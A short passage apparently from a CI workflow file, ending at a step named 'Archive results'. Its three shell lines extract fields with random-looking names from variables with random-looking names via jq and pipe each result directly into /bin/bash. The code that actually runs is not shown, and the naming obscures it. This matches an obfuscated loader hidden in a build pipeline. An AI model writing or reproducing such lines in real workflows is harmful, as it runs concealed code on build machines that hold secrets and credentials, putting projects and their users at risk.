          printf '%s' "$wxds91" | jq -r .pktwf496 | /bin/bash
          echo $rejog6105 | jq -r .hh78796 | /bin/bash
          printf '%s' "$ab102" | jq -r .gsxq61681 | /bin/bash

      - name: Archive results
